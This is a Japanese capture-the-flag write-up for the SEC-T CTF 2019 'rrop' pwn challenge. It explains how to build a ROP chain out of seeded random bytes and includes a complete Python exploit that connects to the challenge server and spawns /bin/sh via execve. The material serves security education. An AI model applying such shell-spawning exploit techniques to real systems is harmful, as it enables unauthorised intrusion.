# [pwn 537pts] rrop - SEC-T CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               2       chall
```
バイナリは入力した指定したシードでsrandを実行し、mmapで0x8000バイトの領域を作ってrandでランダムな値を書き込みます。この際確保されたアドレスは貰えます。
次に乱数を書き込んだ領域をmprotectでRXにし、さらに0x1000バイトの別の領域(stack)をmmapします。最後にRSPをstack + randomに設定し、他のレジスタは空にされます。(rbpは変な場所を指してる。）
このrspにreadで0x100バイト書けるので、要するにランダムに生成された領域をROP gadgetとして使えという問題です。
競技中は数時間かけて思いついたのですが、次のような方針でROP gadgetを作りました。

1. `push rsp; pop rdi; ret;`でrdiにrspを移す。
2. `std; ret;`でDFを1にする
3. `pop rax; ret;`でraxを設定する
4. `stosd; ret`でeaxをrdiに書き込んでrdi-=4する。(DF=1なので減算)
5. 3と4を繰り返してrsp周辺に/bin/shを書き込む
6. `cld; ret;`でDFを0にし、`stosd; ret;`でrdi+=4する。（この時点でrdiは`/bin/sh`を指している）
7. `pop rax; ret;`でraxを59(=SYS_execve)にする
8. `syscall`でシェルを起動する

なんでこんなややこしいことをしているかというと、長いROP gadgetが見つかる可能性が低いからです。ROP gadgetの数を抑えつつバイト数が短いROP gadgetを選択する必要があります。（retがあるので最低でも2バイト）stosdやstosbは1バイトですし、pushやpopも1バイトです。

最終的に作ったexploitがこちらです。
```python
from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')

seed = 7282

#sock = Process("./chall")
sock = Socket("rrop-01.pwn.beer", 45243)
sock.sendlineafter("seed: ", str(seed))
sock.recvuntil("addr: ")
rop_base = int(sock.recvline(), 16)
logger.info("rop base = " + hex(rop_base))

glibc.srand(seed)
gadgets = b''
for j in range(0x2000):
    gadgets += p32(glibc.rand())
rop_pop_rax = rop_base + gadgets.index(b'\x58\xc3')
rop_pop_rdi = rop_base + gadgets.index(b'\x5f\xc3')
rop_ret = rop_base + gadgets.index(b'\xc3')
rop_mov_rdi_rsp = rop_base + gadgets.index(b'\x54\x5f\xc3')
rop_syscall = rop_base + gadgets.index(b'\x0f\x05')
rop_stosd = rop_base + 0x000000000000746a
rop_std = rop_base + 0x000000000000690d
rop_cld = rop_base + 0x00000000000023d4

def mov_rdi_rsp():
    payload  = p64(rop_ret) * 8
    payload += p64(rop_mov_rdi_rsp)
    return payload

def write_to_stack(val):
    payload  = p64(rop_pop_rax)
    payload += p64(val)
    payload += p64(rop_std)
    payload += p64(rop_stosd)
    return payload

payload = b''
payload += mov_rdi_rsp()

string = b'/bin/sh\x00'
for i in range(0, len(string), 4):
    payload += write_to_stack(u32(string[len(string) - i - 4:len(string) - i]))
payload += p64(rop_cld)
payload += p64(rop_stosd)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
payload += p64(0xffffffffffffffff)
sock.sendafter("rrop: ", payload)

sock.interactive()
```

# 感想
面白かったです。